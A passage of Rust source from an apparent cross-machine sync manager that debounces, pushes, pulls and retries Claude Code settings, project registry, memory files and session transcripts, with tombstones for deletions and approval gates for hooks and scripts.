        let mut poll_failures: usize = 0;
        let mut next_full_pull = Instant::now() + FULL_PULL_INTERVAL;
        // The hourly full transcript listing, and whether one is owed: the
        // startup pull failed before queueing it, or an hourly one came due
        // while pulls were failing. It then goes with the next good pull.
        let mut next_transcript_pull = Instant::now() + TRANSCRIPT_FULL_PULL_INTERVAL;
        let mut transcript_pull_owed = initial_retry_pull;
        let mut tick = tokio::time::interval(Duration::from_millis(100));
        tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);

        loop {
            tokio::select! {
                _ = shutdown_rx.changed() => {
                    if *shutdown_rx.borrow() {
                        return;
                    }
                }
                maybe = event_rx.recv() => {
                    let Some(change) = maybe else { return };
                    if let Some(scope) = self.classify(&change, &push_state).await {
                        if scope == DebounceScope::Transcripts {
                            if let Some(ts) = self.transcripts() {
                                pending_transcripts.extend(
                                    change
                                        .paths
                                        .iter()
                                        .filter(|p| ts.is_transcript_path(p))
                                        .cloned(),
                                );
                            }
                            transcripts_waiting_since.get_or_insert_with(Instant::now);
                        }
                        // A fresh local change supersedes the pending retry:
                        // the debounced push covers the same key with newer
                        // content.
                        retry.remove(&scope);
                        last_seen.insert(scope, Instant::now());
                    }
                }
                Some(command) = command_rx.recv() => {
                    match command {
                        LoopCommand::GatesChanged => {
                            self.reapply_gates(&push_state).await;
                        }
                        LoopCommand::EnvSyncTurnedOn => {
                            self.resolve_opt_in_key(CLAUDE_ENV_SYNC_KEY, &push_state).await;
                        }
                        LoopCommand::RemoveServerEnv(reply) => {
                            let res = self.do_remove_server_env(&push_state).await;
                            let _ = reply.send(res);
                        }
                        LoopCommand::PullNow(reply) => {
                            let res = if self.pulled_within(PULL_NOW_FLOOR) {
                                Ok(())
                            } else {
                                let pending = pending_push_keys(&last_seen, &retry);
                                // Transcripts too, with a full listing: an
                                // explicit request, rare, and the index poll
                                // is up to 30 s away.
                                let res = self
                                    .full_pull(
                                        &push_state,
                                        PullScope::Changes { pending: &pending },
                                        transcript_jobs.as_ref(),
                                    )
                                    .await;
                                match &res {
                                    Ok(()) => {
                                        retry_pull = None;
                                        next_full_pull = Instant::now() + FULL_PULL_INTERVAL;
                                        next_projects_poll = Instant::now() + PROJECTS_POLL_INTERVAL;
                                        if transcript_jobs.is_some() {
                                            transcript_pull_owed = false;
                                            next_transcript_pull =
                                                Instant::now() + TRANSCRIPT_FULL_PULL_INTERVAL;
                                        }
                                    }
                                    Err(e) if is_transient(e) => {
                                        retry_pull.get_or_insert_with(RetrySchedule::first);
                                        // The transcript pull asked for
                                        // goes with the retry.
                                        transcript_pull_owed |= transcript_jobs.is_some();
                                    }
                                    Err(_) => {}
                                }
                                res
                            };
                            let _ = reply.send(res);
                        }
                    }
                }
                _ = tick.tick() => {
                    // Whichever request met the refused refresh (a push, the
                    // poll, the transcript worker), the whole run ends within
                    // a tick; a token saved or not saved shows up here too.
                    if self.publish_session_health() {
                        self.halt_signed_out();
                        return;
                    }
                    let now = Instant::now();

                    // Pushes a pull asked for go through the normal debounced
                    // path (merge, CAS, retry), merged with any watcher event
                    // for the same scope.
                    let requested: Vec<DebounceScope> =
                        push_state.lock().await.push_requests.drain().collect();
                    for scope in requested {
                        retry.remove(&scope);
                        last_seen.entry(scope).or_insert(now);
                    }

                    let mut due = Vec::new();
                    for (scope, t) in &last_seen {
                        let idle = now.duration_since(*t);
                        let is_due = match scope {
                            DebounceScope::Transcripts => {
                                idle >= Duration::from_millis(TRANSCRIPT_DEBOUNCE_MS)
                                    || transcripts_waiting_since.is_some_and(|since| {
                                        now.duration_since(since)
                                            >= Duration::from_millis(TRANSCRIPT_MAX_WAIT_MS)
                                    })
                            }
                            DebounceScope::Projects
                            | DebounceScope::Settings
                            | DebounceScope::MnemosSettingsToml => {
                                idle >= Duration::from_millis(LOCAL_DEBOUNCE_MS)
                            }
                            _ => idle >= Duration::from_millis(GLOBAL_DEBOUNCE_MS),
                        };
                        if is_due {
                            due.push(scope.clone());
                        }
                    }
                    for scope in due {
                        last_seen.remove(&scope);
                        if scope == DebounceScope::Transcripts {
                            transcripts_waiting_since = None;
                            let paths: Vec<PathBuf> = pending_transcripts.drain().collect();
                            if let Some(jobs) = transcript_jobs.as_ref().filter(|_| !paths.is_empty()) {
                                let _ = jobs.send(TranscriptJob::Push(paths));
                            }
                            continue;
                        }
                        let me = self.clone();
                        let st = push_state.clone();
                        // Each push runs to completion before we accept the
                        // next event for this scope (last_seen keeps it from
                        // being re-queued mid-flight via debounce reset).
                        if let Err(e) = me.dispatch_push(scope.clone(), st).await {
                            tracing::warn!(target: "mnemos_ide_sync::manager", ?scope, "push failed: {e:#}");
                            if is_transient(&e) {
                                retry.insert(scope, RetrySchedule::first());
                            }
                        }
                    }

                    // Transient-failure retries, on their own backoff.
                    let due_retries: Vec<DebounceScope> = retry
                        .iter()
                        .filter(|(scope, sched)| {
                            sched.next_at <= now && !last_seen.contains_key(*scope)
                        })
                        .map(|(scope, _)| scope.clone())
                        .collect();
                    for scope in due_retries {
                        let sched = retry.remove(&scope).unwrap_or_else(RetrySchedule::first);
                        let me = self.clone();
                        let st = push_state.clone();
                        match me.dispatch_push(scope.clone(), st).await {
                            Ok(()) => tracing::info!(
                                target: "mnemos_ide_sync::manager",
                                ?scope,
                                attempts = sched.attempts,
                                "retry succeeded",
                            ),
                            Err(e) => {
                                tracing::warn!(
                                    target: "mnemos_ide_sync::manager",
                                    ?scope,
                                    attempts = sched.attempts,
                                    "retry failed: {e:#}",
                                );
                                if is_transient(&e) {
                                    retry.insert(scope, sched.backed_off());
                                }
                            }
                        }
                    }

                    // A pull that died offline leaves this machine without the
                    // other machine's changes, so it retries on the same clock.
                    if let Some(sched) = retry_pull.filter(|s| s.next_at <= now) {
                        retry_pull = None;
                        // A push that failed during the same outage is still
                        // waiting in `retry`; its key must not be overwritten
                        // by the server's older copy before it goes up.
                        let pending = pending_push_keys(&last_seen, &retry);
                        let scope = PullScope::Changes { pending: &pending };
                        let transcripts = transcript_jobs.as_ref().filter(|_| transcript_pull_owed);
                        match self.full_pull(&push_state, scope, transcripts).await {
                            Ok(()) => {
                                next_full_pull = Instant::now() + FULL_PULL_INTERVAL;
                                next_projects_poll = Instant::now() + PROJECTS_POLL_INTERVAL;
                                if transcripts.is_some() {
                                    transcript_pull_owed = false;
                                    next_transcript_pull =
                                        Instant::now() + TRANSCRIPT_FULL_PULL_INTERVAL;
                                }
                            }
                            Err(e) => {
                                tracing::warn!(
                                    target: "mnemos_ide_sync::manager",
                                    attempts = sched.attempts,
                                    "pull retry failed: {e:#}",
                                );
                                if is_transient(&e) {
                                    retry_pull = Some(sched.backed_off());
                                }
                            }
                        }
                    }

                    // Periodic full pull: every key and the team scope.
                    // Skipped while a failed pull is retrying on its own
                    // backoff. Transcripts come through the index poll and
                    // their own hourly listing below.
                    if now >= next_full_pull {
                        next_full_pull = now + FULL_PULL_INTERVAL;
                        if retry_pull.is_none() {
                            let pending = pending_push_keys(&last_seen, &retry);
                            let scope = PullScope::Changes { pending: &pending };
                            match self.full_pull(&push_state, scope, None).await {
                                Ok(()) => {
                                    next_projects_poll = Instant::now() + PROJECTS_POLL_INTERVAL;
                                }
                                Err(e) => {
                                    tracing::warn!(
                                        target: "mnemos_ide_sync::manager",
                                        "periodic pull failed: {e:#}",
                                    );
                                    if is_transient(&e) {
                                        retry_pull = Some(RetrySchedule::first());
                                    }
                                }
                            }
                        }
                    }

                    // The hourly full transcript listing, the safety net
                    // behind the index poll (the worker sweeps first). While
                    // pulls are failing it goes with the pull retry instead.
                    if now >= next_transcript_pull {
                        next_transcript_pull = now + TRANSCRIPT_FULL_PULL_INTERVAL;
                        if retry_pull.is_some() {
                            transcript_pull_owed = true;
                        } else if let Some(jobs) = &transcript_jobs {
                            transcript_pull_owed = false;
                            let _ = jobs.send(TranscriptJob::Pull);
                        }
                    }

                    // Live pull of the project registry, so a project opened
                    // or added on the other machine shows up here within
                    // seconds instead of at the next restart; then of the
                    // session index, so a session continued there arrives
                    // here as soon.
                    if Instant::now() >= next_projects_poll {
                        let polled = match self.poll_projects(&push_state).await {
                            Ok(()) => match &transcript_jobs {
                                Some(jobs) => self.poll_session_index(&push_state, jobs).await,
                                None => Ok(()),
                            },
                            Err(e) => Err(e),
                        };
                        match polled {
                            Ok(()) => {
                                poll_failures = 0;
                                next_projects_poll = Instant::now() + PROJECTS_POLL_INTERVAL;
                            }
                            Err(e) => {
                                poll_failures += 1;
                                let step = (poll_failures - 1).min(TRANSIENT_RETRY_BACKOFF_MS.len() - 1);
                                let backoff = Duration::from_millis(TRANSIENT_RETRY_BACKOFF_MS[step]);
                                next_projects_poll =
                                    Instant::now() + backoff.max(PROJECTS_POLL_INTERVAL);
                                // Once per outage, not every 30 s while offline.
                                if poll_failures == 1 {
                                    tracing::warn!(target: "mnemos_ide_sync::manager", "live poll failed: {e:#}");
                                } else {
                                    tracing::debug!(
                                        target: "mnemos_ide_sync::manager",
                                        attempts = poll_failures,
                                        "live poll failed: {e:#}",
                                    );
                                }
                            }
                        }
                    }

                    // Suppression GC
                    push_state.lock().await.drop_expired();
                }
            }
        }
    }

    /// Pull every key (and the team scope). With `transcripts`, then queue
    /// a full-listing transcript pull on it.
    async fn full_pull(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
        scope: PullScope<'_>,
        transcripts: Option<&mpsc::UnboundedSender<TranscriptJob>>,
    ) -> Result<(), IdeError> {
        self.do_pull_all(push_state, scope).await?;
        if let Some(jobs) = transcripts {
            let _ = jobs.send(TranscriptJob::Pull);
        }
        Ok(())
    }

    /// Live pull of the project registry: one GET of the `projects` key,
    /// applied only when its version moved since we last pulled or pushed it.
    async fn poll_projects(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let Some(state) = self.client.get_state(registry::PROJECTS_KEY).await? else {
            return Ok(());
        };
        let known = push_state
            .lock()
            .await
            .known_version
            .get(registry::PROJECTS_KEY)
            .copied();
        if known == Some(state.version) {
            return Ok(());
        }
        tracing::info!(
            target: "mnemos_ide_sync::manager",
            version = state.version,
            known = ?known,
            "projects changed on the server; applying",
        );
        self.apply_pulled(&state, push_state).await;
        Ok(())
    }

    /// Live pull of transcripts: one GET of the session index. When its
    /// version moved (or the last index pull left a session to retry), the
    /// transcript worker pulls just the sessions it names that have segments
    /// not applied here. Our own index pushes move the version too; the
    /// worker then finds nothing to fetch, without a request.
    async fn poll_session_index(
        &self,
        push_state: &Arc<AsyncMutex<PushState>>,
        jobs: &mpsc::UnboundedSender<TranscriptJob>,
    ) -> Result<(), IdeError> {
        let Some(state) = self.client.get_state(SESSION_INDEX_KEY).await? else {
            return Ok(());
        };
        let retry = self.transcripts().is_some_and(|t| t.wants_index_retry());
        {
            let mut st = push_state.lock().await;
            if st.session_index_seen == Some(state.version) && !retry {
                return Ok(());
            }
            st.session_index_seen = Some(state.version);
        }
        tracing::debug!(
            target: "mnemos_ide_sync::manager",
            version = state.version,
            retry,
            "session index changed; pulling the sessions it names",
        );
        let _ = jobs.send(TranscriptJob::PullIndexed(state.value));
        Ok(())
    }

    /// Record this machine's newly uploaded transcript segments in the shared
    /// session index (merged per session and machine, CAS with retries, like
    /// any key), so the other machine's poll fetches just those sessions.
    /// What is owed stays in the transcript state until the write lands: a
    /// failure loses no segment, and the next push or sweep tries again.
    async fn push_session_index(
        self: &Arc<Self>,
        sync: &TranscriptSync,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let Some(owed) = sync.index_owed().await? else {
            return Ok(());
        };
        self.push_with_merge(SESSION_INDEX_KEY, owed.clone(), push_state)
            .await?;
        sync.index_written(&owed).await
    }

    /// Classify a watcher event into the scope whose push it should trigger.
    /// Returns `None` if the event is suppressed or doesn't match any sync key.
    ///
    /// Paths arrive in the configured spelling of `self.paths`: the watcher
    /// canonicalizes both its targets and the reported paths and maps a
    /// canonical report (FSEvents' `/private/var/...`, a symlinked
    /// `~/.claude`) back before sending it (`watcher::translate`), so the
    /// plain comparisons below, the suppression set and the memory lookups
    /// all agree.
    async fn classify(
        &self,
        change: &crate::watcher::ChangeEvent,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Option<DebounceScope> {
        let transcripts = self.transcripts();
        let mut st = push_state.lock().await;
        // The memory key of each project dir the event touches, looked up
        // once per event.
        let mut memory_keys: HashMap<String, Option<String>> = HashMap::new();
        // Deletes and re-creations are recorded for every path of the event
        // (a rename carries both of its paths) before the event is
        // classified by its first match below.
        for path in &change.paths {
            if st.is_suppressed(path) {
                continue;
            }
            self.note_dir_change(&mut st, path).await;
            if let Some((slug, name)) = memory_name_of(&self.paths.claude_projects_dir, path) {
                let key = match memory_keys.get(&slug) {
                    Some(key) => key.clone(),
                    None => {
                        let key = self.memory_key_for_dir(&slug).await;
                        memory_keys.insert(slug.clone(), key.clone());
                        key
                    }
                };
                if let Some(key) = key {
                    note_memory_change(
                        &mut st,
                        &self.paths.claude_projects_dir,
                        path,
                        &slug,
                        name,
                        key,
                    );
                }
            }
        }
        for path in &change.paths {
            if st.is_suppressed(path) {
                continue;
            }
            // Mnemos data files. `workspace_state.json` is not among them: it
            // is local-only, so a change to it never becomes a push.
            if let Some(p) = self.paths.projects_json() {
                if *path == p {
                    return Some(DebounceScope::Projects);
                }
            }
            if let Some(p) = self.paths.settings_json() {
                if *path == p {
                    return Some(DebounceScope::Settings);
                }
            }
            if let Some(p) = self.paths.mnemos_settings_toml() {
                if path.as_path() == p {
                    return Some(DebounceScope::MnemosSettingsToml);
                }
            }
            // ~/.claude.json
            if *path == self.paths.claude_json {
                return Some(DebounceScope::ClaudeJsonMcp);
            }
            // ~/.claude/<file>
            for f in GLOBAL_FILES {
                let candidate = self.paths.claude_dir.join(f.file_name);
                if *path == candidate {
                    return Some(DebounceScope::GlobalFile(f.sync_key));
                }
            }
            // ~/.claude/<dir>/...
            for d in DIRECTORIES {
                let dir = self.paths.claude_dir.join(d.relative);
                if path.starts_with(&dir) {
                    return Some(DebounceScope::Directory(d.sync_key));
                }
            }
            // ~/.claude/projects/<slug>/<session>.jsonl. Checked before
            // memory, which lives under the same root. A deleted transcript
            // has nothing to upload.
            if let Some(ts) = &transcripts {
                if !change.is_remove && ts.is_transcript_path(path) {
                    return Some(DebounceScope::Transcripts);
                }
            }
            // ~/.claude/projects/<slug>/memory/... or .../MEMORY.md
            if path.starts_with(&self.paths.claude_projects_dir) {
                let rel = path
                    .strip_prefix(&self.paths.claude_projects_dir)
                    .ok()?
                    .to_path_buf();
                let mut comps = rel.components();
                let project_dir = comps.next()?.as_os_str().to_string_lossy().into_owned();
                let inside = comps.collect::<PathBuf>();
                let inside_str = inside.to_string_lossy().to_string();
                let touches_memory = inside_str.starts_with("memory") || inside_str == "MEMORY.md";
                if !touches_memory {
                    continue;
                }
                let key = match memory_keys.remove(&project_dir) {
                    Some(key) => key,
                    None => self.memory_key_for_dir(&project_dir).await,
                };
                return key.map(DebounceScope::Memory);
            }
        }
        None
    }

    /// Record a path under a synced `~/.claude` directory the watcher
    /// reported: gone -> a tombstone for the file, or for every file the
    /// last sync had under it when it was a directory (macOS and Windows
    /// report a moved directory by its own path only, and a skill is a
    /// directory); there again -> revived (for a directory, every file in
    /// it the key syncs).
    async fn note_dir_change(&self, st: &mut PushState, path: &Path) {
        let Some((cfg, dir)) = DIRECTORIES.iter().find_map(|d| {
            let dir = self.paths.claude_dir.join(d.relative);
            path.starts_with(&dir).then_some((d, dir))
        }) else {
            return;
        };
        let Ok(rel) = path.strip_prefix(&dir) else {
            return;
        };
        let rel = rel.to_string_lossy().replace('\\', "/");
        if !rel.is_empty() && !syncs_rel(cfg, &rel) {
            return;
        }
        let prefix = if rel.is_empty() {
            String::new()
        } else {
            format!("{rel}/")
        };
        let key = cfg.sync_key.to_string();
        match std::fs::metadata(path) {
            Ok(meta) => {
                let rels: Vec<String> = if meta.is_dir() {
                    synced_files(&dir, cfg)
                        .into_iter()
                        .map(|(r, _)| r)
                        .filter(|r| r.starts_with(&prefix))
                        .collect()
                } else if is_synced_file_name(cfg, &rel) {
                    vec![rel]
                } else {
                    Vec::new()
                };
                for rel in rels {
                    if let Some(tombs) = st.pending_dir_tombstones.get_mut(&key) {
                        tombs.remove(&rel);
                    }
                    st.pending_dir_revivals
                        .entry(key.clone())
                        .or_default()
                        .insert(rel);
                }
            }
            Err(_) => {
                let rels: Vec<String> = if is_synced_file_name(cfg, &rel) {
                    vec![rel]
                } else {
                    self.baseline(st)
                        .await
                        .keys
                        .get(&key)
                        .map(|e| {
                            e.files
                                .keys()
                                .filter(|r| r.starts_with(&prefix))
                                .cloned()
                                .collect()
                        })
                        .unwrap_or_default()
                };
                let now = now_ms();
                for rel in rels {
                    if let Some(revived) = st.pending_dir_revivals.get_mut(&key) {
                        revived.remove(&rel);
                    }
                    st.pending_dir_tombstones
                        .entry(key.clone())
                        .or_default()
                        .insert(rel, now);
                }
            }
        }
    }

    /// Map a `~/.claude/projects/<slug>` dir name to the project's git repo.
    ///
    /// First by slugging each record's checkout on this machine (its
    /// `paths.<platform>` slot, or a legacy `path` of this platform's shape;
    /// never another machine's path, whose slug Claude Code here never
    /// writes). Failing that, the dir's own transcripts name the `cwd`
    /// Claude ran in: its enclosing checkout's `origin` identifies the
    /// project, and that checkout is learned as the record's local path so
    /// the next call is direct.
    ///
    /// Returns the registry's own spelling of `gitRepo`, which is what every
    /// machine builds the memory key from.
    async fn git_repo_for_project_dir(&self, project_dir_name: &str) -> Option<String> {
        let projects_path = self.paths.projects_json()?;
        let bytes = tokio::fs::read(&projects_path).await.ok()?;
        let value: Value = serde_json::from_slice(&bytes).ok()?;
        let projects = value.get("projects")?.as_array()?;
        let platform = current_platform();
        for p in projects {
            let Some(local) = registry::record_local_path(p, platform) else {
                continue;
            };
            let Some(slug) = claude_project_dir_name(Path::new(&local)) else {
                continue;
            };
            if same_dir_name(&slug, project_dir_name, platform) {
                if let Some(repo) = git_repo_of(p) {
                    return Some(repo.to_string());
                }
            }
        }
        // Not registered under a local path — learn it from the transcripts.
        let project_dir = self.paths.claude_projects_dir.join(project_dir_name);
        let store_dir = self.paths.mnemos_store_dir.clone();
        let (root, remote) = tokio::task::spawn_blocking(move || {
            let cwd = cwd_from_transcripts(&project_dir, &pulled_sessions(store_dir.as_deref()))?;
            repo_root_and_remote(&cwd)
        })
        .await
        .ok()??;
        let key = registry::git_repo_key(&remote);
        let known = projects
            .iter()
            .filter_map(git_repo_of)
            .find(|g| registry::git_repo_key(g) == key)?
            .to_string();
        self.learn_platform_path(&known, &root).await;
        Some(known)
    }

    /// Record `root` as this machine's checkout of `git_repo` (see
    /// [`learn_platform_path_in`]: fills one empty slot, never overwrites).
    /// Best-effort; a failure just means the next lookup learns it again.
    async fn learn_platform_path(&self, git_repo: &str, root: &Path) {
        let repo = git_repo.to_string();
        let root_owned = root.to_path_buf();
        let learned = self
            .update_store(move |s| {
                learn_platform_path_in(s, &repo, &root_owned, current_platform())
            })
            .await;
        match learned {
            Ok(Some(id)) => tracing::info!(
                target: "mnemos_ide_sync::manager",
                git_repo,
                id,
                root = %root.display(),
                "learned this machine's checkout for project",
            ),
            Ok(None) => {}
            Err(e) => tracing::warn!(
                target: "mnemos_ide_sync::manager",
                git_repo,
                "failed to persist learned checkout: {e:#}",
            ),
        }
    }

    /// Run `f` as one locked load -> mutate -> normalize -> save of this
    /// manager's `projects.json` (`ProjectStore::update_blocking_at`), on the
    /// blocking pool. The app's own edits take the same process-wide lock, so
    /// neither side can overwrite the other's change. `f` must not call
    /// another `ProjectStore::update_*` (the lock is not reentrant).
    async fn update_store<R, F>(&self, f: F) -> Result<R, IdeError>
    where
        F: FnOnce(&mut ProjectStore) -> R + Send + 'static,
        R: Send + 'static,
    {
        let (Some(projects), Some(workspace)) = (
            self.paths.projects_json(),
            self.paths.workspace_state_json(),
        ) else {
            return Err(IdeError::Other("no Mnemos data dir".to_string()));
        };
        tokio::task::spawn_blocking(move || {
            ProjectStore::update_blocking_at(projects, workspace, f)
        })
        .await
        .map_err(|e| IdeError::Other(format!("project store task: {e}")))?
        .map_err(IdeError::from)
    }

    async fn dispatch_push(
        self: Arc<Self>,
        scope: DebounceScope,
        push_state: Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        // Hooks without the opt-in are never pushed from here.
        if scope.sync_key().is_some_and(|key| self.key_skipped(&key)) {
            return Ok(());
        }
        match scope {
            DebounceScope::Projects => self.push_file_json("projects", &push_state).await,
            DebounceScope::Settings => self.push_file_json("settings", &push_state).await,
            DebounceScope::MnemosSettingsToml => self.push_mnemos_settings_toml(&push_state).await,
            DebounceScope::ClaudeJsonMcp => self.push_claude_json_mcp(&push_state).await,
            DebounceScope::GlobalFile(sync_key) => {
                self.push_global_file(sync_key, &push_state).await
            }
            DebounceScope::Directory(sync_key) => self.push_directory(sync_key, &push_state).await,
            DebounceScope::Memory(sync_key) => self.push_memory(&sync_key, &push_state).await,
            // Batched by the event loop and uploaded by the transcript
            // worker; never pushed as a state key.
            DebounceScope::Transcripts => Ok(()),
        }
    }

    /// Read the local `workspace_state.json` and return the set of project ids
    /// whose sync is disabled on this machine. Returns an empty set on any
    /// failure (missing file, parse error) — sync remains on for everything
    /// in that case.
    async fn load_sync_disabled_set(&self) -> HashSet<String> {
        let Some(path) = self.paths.workspace_state_json() else {
            return HashSet::new();
        };
        let bytes = match tokio::fs::read(&path).await {
            Ok(b) => b,
            Err(_) => return HashSet::new(),
        };
        let value: Value = match serde_json::from_slice(&bytes) {
            Ok(v) => v,
            Err(_) => return HashSet::new(),
        };
        collect_sync_disabled_from_value(&value)
    }

    /// Push the synced settings of the Mnemos `settings.toml` under
    /// [`SETTINGS_V2_KEY`] (`crate::settings_toml`): only the settings the
    /// policy marks as synced, laid over the server's copy. Nothing goes up
    /// from a file that does not parse, or without a policy.
    async fn push_mnemos_settings_toml(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let (Some(path), Some(policy)) = (
            self.paths.mnemos_settings_toml().map(Path::to_path_buf),
            self.settings_policy.as_ref(),
        ) else {
            return Ok(());
        };
        let bytes = match tokio::fs::read(&path).await {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(e) => return Err(IdeError::Other(format!("read {:?}: {e}", path))),
        };
        let Some(local) = settings_toml::extract(&String::from_utf8_lossy(&bytes), policy) else {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                "settings.toml does not parse; not pushed",
            );
            return Ok(());
        };
        self.push_local_value(SETTINGS_V2_KEY, LocalValue::Settings(local), push_state)
            .await?;
        Ok(())
    }

    async fn push_file_json(
        self: &Arc<Self>,
        which: &str,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let (path, sync_key) = match which {
            "projects" => (self.paths.projects_json(), "projects"),
            "settings" => (self.paths.settings_json(), "settings"),
            _ => return Ok(()),
        };
        let Some(path) = path else {
            return Ok(());
        };
        let bytes = match tokio::fs::read(&path).await {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(e) => return Err(IdeError::Other(format!("read {:?}: {e}", path))),
        };
        let value: Value = serde_json::from_slice(&bytes)?;
        if sync_key == registry::PROJECTS_KEY {
            return self.push_projects(value, push_state).await;
        }
        self.push_with_merge(sync_key, value, push_state).await
    }

    /// Push the project registry as read from disk (`disk`).
    async fn push_projects(
        self: &Arc<Self>,
        disk: Value,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        // Our own pull writes arrive here too, through the watcher. A file
        // that still holds exactly what we last synced has nothing new for
        // the server. Judged by content rather than a time window, so an
        // edit the app makes while a pull is being applied is still pushed.
        let unchanged = push_state
            .lock()
            .await
            .projects_synced
            .as_ref()
            .is_some_and(|synced| registry::projects_semantically_equal(synced, &disk));
        if unchanged {
            tracing::debug!(target: "mnemos_ide_sync::manager", "projects.json unchanged since last sync");
            return Ok(());
        }
        let disabled = self.load_sync_disabled_set().await;
        let outgoing = filter_projects_for_push(disk.clone(), &disabled);
        match self
            .push_with_merge_value(registry::PROJECTS_KEY, outgoing, push_state)
            .await?
        {
            // The server now holds the merge of ours and its own, which can
            // carry records this machine has not seen. Fold them in now:
            // `known_version` already names the version just written, so the
            // live poll would not fetch them until someone else pushes.
            Some(server) => {
                if let Err(e) = self.apply_projects(&server, push_state).await {
                    tracing::warn!(
                        target: "mnemos_ide_sync::manager",
                        "pushed projects, but applying the merged registry failed: {e:#}",
                    );
                }
            }
            None => push_state.lock().await.projects_synced = Some(disk),
        }
        Ok(())
    }

    async fn push_global_file(
        self: &Arc<Self>,
        sync_key: &'static str,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let cfg = GLOBAL_FILES
            .iter()
            .find(|f| f.sync_key == sync_key)
            .unwrap();
        if cfg.opt_in && !self.claude_env_enabled() {
            return Ok(());
        }
        let path = self.paths.claude_dir.join(cfg.file_name);
        let bytes = match tokio::fs::read(&path).await {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(e) => return Err(IdeError::Other(format!("read {:?}: {e}", path))),
        };
        let value = if cfg.raw {
            Value::String(String::from_utf8_lossy(&bytes).to_string())
        } else {
            serde_json::from_slice(&bytes)?
        };
        let local = if cfg.platform_specific {
            // A JSON settings object must not carry another platform's slot
            // inside it — see `strip_nested_platform_keys`. Raw (string)
            // files are left alone.
            let value = if cfg.raw {
                value
            } else {
                strip_nested_platform_keys(value)
            };
            LocalValue::PlatformSlot(value)
        } else {
            LocalValue::Whole(value)
        };
        self.push_local_value(sync_key, local, push_state).await?;
        Ok(())
    }

    /// Push a directory key: its files, plus a tombstone (`__deleted`) for
    /// each file deleted here since the last push. Deletes are not sent
    /// when the directory itself is gone: a moved, renamed or unmounted
    /// directory looks the same as every file in it deleted. An emptied
    /// directory is still a decision.
    async fn push_directory(
        self: &Arc<Self>,
        sync_key: &'static str,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        let cfg = DIRECTORIES.iter().find(|d| d.sync_key == sync_key).unwrap();
        let dir = self.paths.claude_dir.join(cfg.relative);
        let mut files: DirMap = serialize_directory(&dir, cfg)
            .and_then(|v| v.as_object().cloned())
            .unwrap_or_default();
        let (mut tombs, revived) = {
            let st = push_state.lock().await;
            (
                st.pending_dir_tombstones
                    .get(sync_key)
                    .cloned()
                    .unwrap_or_default(),
                st.pending_dir_revivals
                    .get(sync_key)
                    .cloned()
                    .unwrap_or_default(),
            )
        };
        // A file that exists again is no longer deleted.
        tombs.retain(|rel, _| !files.contains_key(rel));
        if !tombs.is_empty() && std::fs::read_dir(&dir).is_err() {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                sync_key,
                count = tombs.len(),
                "not propagating these deletes: the directory itself is gone; delete them on the other machine too if they were meant",
            );
            push_state
                .lock()
                .await
                .pending_dir_tombstones
                .remove(sync_key);
            tombs.clear();
        }
        if files.is_empty() && tombs.is_empty() {
            return Ok(());
        }
        if !tombs.is_empty() {
            files.insert(DIR_TOMBSTONES_KEY.to_string(), json!(tombs));
        }
        let local = LocalValue::Directory {
            cfg,
            files,
            revived: revived.clone(),
        };
        self.push_local_value(sync_key, local, push_state).await?;
        let mut st = push_state.lock().await;
        if let Some(pending) = st.pending_dir_tombstones.get_mut(sync_key) {
            pending.retain(|rel, at| tombs.get(rel) != Some(at));
            if pending.is_empty() {
                st.pending_dir_tombstones.remove(sync_key);
            }
        }
        if let Some(pending) = st.pending_dir_revivals.get_mut(sync_key) {
            pending.retain(|rel| !revived.contains(rel));
            if pending.is_empty() {
                st.pending_dir_revivals.remove(sync_key);
            }
        }
        Ok(())
    }

    /// Before a directory key's files are merged with the server's copy: a
    /// local file the server has a tombstone for, that was not touched here
    /// since the delete (and was not revived), counts as deleted here too.
    /// It leaves the payload and moves to the backups; a gated file only
    /// leaves the payload until its deletion is approved here.
    async fn settle_against_tombstones(
        &self,
        cfg: &DirectorySync,
        files: &mut DirMap,
        server: Option<&DirMap>,
        revived: &BTreeSet<String>,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) {
        let Some(tombs) = server
            .and_then(|s| s.get(DIR_TOMBSTONES_KEY))
            .and_then(Value::as_object)
        else {
            return;
        };
        let dir = self.paths.claude_dir.join(cfg.relative);
        let backups = Backups::new(&self.paths);
        let gate_dir = gates::gate_kind(cfg.sync_key) == Some(GateKind::Directory);
        let trust = self.trusts_all_gates();
        for (rel, at) in tombs {
            let Some(at) = at.as_i64() else { continue };
            if !files.contains_key(rel) || revived.contains(rel) {
                continue;
            }
            let normalized = normalize_relative(rel);
            if normalized.is_empty() {
                continue;
            }
            let path = dir.join(&normalized);
            if mtime_ms(&path).await.is_some_and(|local| local > at) {
                continue;
            }
            files.remove(rel);
            // A gated file (hook, agent, command, skill, MCP script) is
            // removed here only by a deletion approved here, as on a pull
            // (`gates::filter_incoming`). Until then it stays on disk, and
            // the push carries the server's tombstone instead of reviving
            // the file, so the other machine's delete is not undone.
            if gate_dir {
                let item = format!("{}/{rel}", cfg.sync_key);
                let allowed = self.read_gates(|g| gates::deletion_allowed(g, &item, at, trust));
                if !allowed {
                    continue;
                }
            }
            push_state.lock().await.suppress(path.clone());
            match backups.take(&path).await {
                Ok(dest) => tracing::info!(
                    target: "mnemos_ide_sync::manager",
                    key = cfg.sync_key,
                    rel,
                    backup = %dest.display(),
                    "deleted on the other machine; moved to the backups",
                ),
                Err(e) => tracing::warn!(
                    target: "mnemos_ide_sync::manager",
